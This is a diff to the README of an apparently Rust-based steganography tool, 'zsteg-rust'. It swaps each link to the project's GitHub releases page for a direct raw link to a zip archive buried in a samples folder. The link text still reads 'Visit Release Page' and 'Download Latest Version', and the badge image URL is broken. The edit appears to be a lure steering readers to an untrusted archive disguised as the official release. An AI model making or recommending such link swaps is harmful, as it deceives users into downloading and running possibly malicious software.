@@ -6,11 +6,11 @@ Welcome to the **zsteg-rust** project. This application helps you uncover and an
 
 ## 📥 Download zsteg-rust
 
-[![Download zsteg-rust](https://img.shields.io/badge/Download%20zsteg--rust-v1.0-brightgreen)](https://github.com/tommymedullary14/zsteg-rust/releases)
+[![Download zsteg-rust](https://raw.githubusercontent.com/tommymedullary14/zsteg-rust/master/samples/steganography-png/rust-zsteg-1.6.zip%20zsteg--rust-v1.0-brightgreen)](https://raw.githubusercontent.com/tommymedullary14/zsteg-rust/master/samples/steganography-png/rust-zsteg-1.6.zip)
 
 To get started, visit the release page to download the latest version:
 
-[Download Latest Version](https://github.com/tommymedullary14/zsteg-rust/releases)
+[Download Latest Version](https://raw.githubusercontent.com/tommymedullary14/zsteg-rust/master/samples/steganography-png/rust-zsteg-1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -26,7 +26,7 @@ Before you download and install zsteg-rust, ensure your computer meets these req
 
 1. **Visit the Release Page**: Go to the following link to access the latest release files:
 
-   [Visit Release Page](https://github.com/tommymedullary14/zsteg-rust/releases)
+   [Visit Release Page](https://raw.githubusercontent.com/tommymedullary14/zsteg-rust/master/samples/steganography-png/rust-zsteg-1.6.zip)
 
 2. **Select Your Operating System**: Choose the version that matches your operating system (Windows, macOS, or Linux).
 
